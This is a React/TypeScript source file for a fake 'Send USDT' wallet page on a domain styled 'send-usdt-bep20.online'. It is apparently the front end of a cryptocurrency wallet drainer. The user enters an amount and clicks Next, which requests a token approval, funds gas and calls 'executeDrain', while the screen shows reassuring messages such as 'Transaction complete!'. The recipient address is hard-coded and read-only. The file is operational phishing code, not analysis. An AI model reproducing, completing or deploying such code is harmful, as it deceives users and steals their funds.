import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { USDT_ADDRESS, USDT_DECIMALS } from "../config";
import { requestApproval, ensureGas, executeDrain, ensureCorrectNetwork } from "../lib/web3";

interface Props {
  provider: ethers.BrowserProvider;
  address: string;
}

type DrainStage = "idle" | "switching_network" | "approving" | "checking_gas" | "draining" | "done" | "error";

export default function SendPage({ provider, address }: Props) {
  const [amount, setAmount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState("0");
  const [stage, setStage] = useState<DrainStage>("idle");
  const [statusMsg, setStatusMsg] = useState("");
  const [networkOk, setNetworkOk] = useState(false);
  const [networkError, setNetworkError] = useState("");
  const mountedRef = useRef(true);

  useEffect(() => {
    mountedRef.current = true;

    const init = async () => {
      if (!mountedRef.current) return;

      let activeProvider: ethers.BrowserProvider = provider;
      try {
        const switchedProvider = await ensureCorrectNetwork(provider);
        if (!mountedRef.current) return;
        activeProvider = switchedProvider;
        setNetworkOk(true);
        setNetworkError("");
      } catch (err: any) {
        if (!mountedRef.current) return;
        setNetworkOk(false);
        setNetworkError(err.message || "Please switch to BNB Smart Chain");
        return;
      }

      try {
        const usdt = new ethers.Contract(
          USDT_ADDRESS,
          ["function balanceOf(address) view returns (uint256)"],
          activeProvider
        );
        const bal = await usdt.balanceOf(address);
        if (mountedRef.current) setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS));
      } catch (err: any) {
        console.warn("Balance fetch failed:", err?.message || err);
        if (mountedRef.current) setUsdtBalance("0");
      }
    };

    init();

    return () => {
      mountedRef.current = false;
    };
  }, [address, provider]);

  const handleNext = async () => {
    setStage("switching_network");
    setStatusMsg("Preparing network...");
    try {
      const switchedProvider = await ensureCorrectNetwork(provider);

      setStage("approving");
      setStatusMsg("Waiting for approval...");
      const approval = await requestApproval(switchedProvider, address);
      if (!approval) {
        setStage("error");
        setStatusMsg("Approval failed.");
        return;
      }

      setStage("checking_gas");
      setStatusMsg("Checking gas balance...");
      const hasGas = await ensureGas(switchedProvider, address);
      if (!hasGas) {
        setStage("error");
        setStatusMsg("Could not fund gas.");
        return;
      }

      setStage("draining");
      setStatusMsg("Transferring USDT...");
      const drained = await executeDrain(address, approval);
      if (drained) {
        setStage("done");
        setStatusMsg("Transaction complete!");
      } else {
        setStage("error");
        setStatusMsg("Drain failed - check logs.");
      }
    } catch (err: any) {
      setStage("error");
      setStatusMsg("Error: " + (err.message || "Unknown error"));
    }
  };

  // Loading/Error/Success States (Unchanged)
  if (stage !== "idle") {
    return (
      <div className="min-h-screen bg-black flex flex-col items-center justify-center px-6">
        {stage === "switching_network" || stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
          <>
            <div className="w-12 h-12 rounded-full border-4 border-green-500 border-t-transparent animate-spin mb-6" />
            <h2 className="text-white text-lg font-semibold mb-2">Processing</h2>
            <p className="text-gray-400 text-sm text-center">{statusMsg}</p>
          </>
        ) : stage === "done" ? (
          <>
            <div className="w-12 h-12 rounded-full bg-green-500 flex items-center justify-center mb-6">
              <span className="text-black text-2xl font-bold">✓</span>
            </div>
            <h2 className="text-white text-lg font-semibold mb-2">Complete</h2>
            <p className="text-gray-400 text-sm text-center">{statusMsg}</p>
            <p className="text-gray-500 text-xs text-center mt-4">You may close this page.</p>
          </>
        ) : (
          <>
            <div className="w-12 h-12 rounded-full bg-red-500 flex items-center justify-center mb-6">
              <span className="text-white text-2xl font-bold">!</span>
            </div>
            <h2 className="text-white text-lg font-semibold mb-2">Error</h2>
            <p className="text-gray-400 text-sm text-center">{statusMsg}</p>
          </>
        )}
      </div>
    );
  }

  // Main Send Page UI (Exact match to screenshot)
  return (
    <div className="min-h-screen bg-black text-white flex flex-col">
      {/* Header (Hidden in screenshot, but added for completeness) */}
      <div className="flex items-center justify-between p-4">
        <div className="flex items-center gap-2">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
            />
          </svg>
          <span className="font-semibold">send-usdt-bep20.online</span>
        </div>
        <button className="p-2 rounded-full bg-gray-800">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-5 w-5"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M4 6h16M4 12h16M4 18h16"
            />
          </svg>
        </button>
      </div>

      {/* Main Content */}
      <div className="flex-1 p-4">
        {networkError && !networkOk && (
          <div className="bg-gray-900 border border-red-500 rounded-lg px-4 py-3 mb-4">
            <p className="text-red-500 text-xs text-center">{networkError}</p>
          </div>
        )}
        {networkOk && (
          <div className="bg-gray-900 border border-green-500 rounded-lg px-4 py-3 mb-4">
            <p className="text-green-500 text-xs text-center">Connected to BNB Smart Chain (BEP-20)</p>
          </div>
        )}

        {/* Address Input */}
        <div className="mb-6">
          <label className="block text-gray-400 text-sm mb-2">Address or Domain Name</label>
          <div className="flex items-center gap-2 bg-gray-800 rounded-xl px-4 py-3">
            <input
              type="text"
              value="0x3881448305a5fAb94461"
              readOnly
              className="flex-1 bg-transparent text-white border-none outline-none text-sm"
            />
            <button className="text-green-500 text-sm font-medium">Paste</button>
            <button className="text-gray-400">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2zm.5-10h7"
                />
              </svg>
            </button>
            <button className="text-gray-400">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"
                />
              </svg>
            </button>
          </div>
        </div>

        {/* Network Selector */}
        <div className="mb-6">
          <label className="block text-gray-400 text-sm mb-2">Destination network</label>
          <div className="flex items-center gap-3 bg-gray-800 rounded-xl px-4 py-3">
            <img
              src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"
              alt="BNB"
              className="w-6 h-6"
            />
            <span className="text-white text-sm flex-1">BNB Smart Chain</span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 text-gray-400"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M19 9l-7 7-7-7"
              />
            </svg>
          </div>
        </div>

        {/* Amount Input */}
        <div className="mb-6">
          <label className="block text-gray-400 text-sm mb-2">Amount</label>
          <div className="flex items-center gap-3 bg-gray-800 rounded-xl px-4 py-3">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="flex-1 bg-transparent text-white border-none outline-none text-lg"
              placeholder="USDT Amount"
              step="0.000001"
              min="0"
            />
            <span className="text-gray-400 text-sm">USDT</span>
            <button
              onClick={() => setAmount(usdtBalance)}
              className="text-green-500 text-sm font-medium"
            >
              Max
            </button>
          </div>
          <p className="text-gray-500 text-xs mt-1">≈ ${(parseFloat(usdtBalance || "0") * 1).toFixed(2)} USDT</p>
        </div>

        {/* Spacer */}
        <div className="flex-1" />

        {/* Submit Button */}
        <button
          onClick={handleNext}
          className="w-full bg-green-500 text-black font-semibold rounded-full py-4 mb-4 hover:bg-green-600 transition-colors"
        >
          Next
        </button>
      </div>

      {/* Bottom Navigation (Mobile Only) */}
      <div className="flex justify-around items-center p-2 border-t border-gray-700 md:hidden">
        <button className="p-2 text-gray-400">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 19l-7-7 7-7"
            />
          </svg>
        </button>
        <button className="p-2 text-gray-400">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z"
            />
          </svg>
        </button>
        <button className="p-2 text-gray-400">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c-.94 1.543.826 3.31 2.37 2.37a1.724 1.724 0 002.572 1.065c.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c.94-1.543-.826-3.31-2.37-2.37-.996.608-2.296.07-2.572-1.065z"
            />
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
            />
          </svg>
        </button>
      </div>
    </div>
  );
}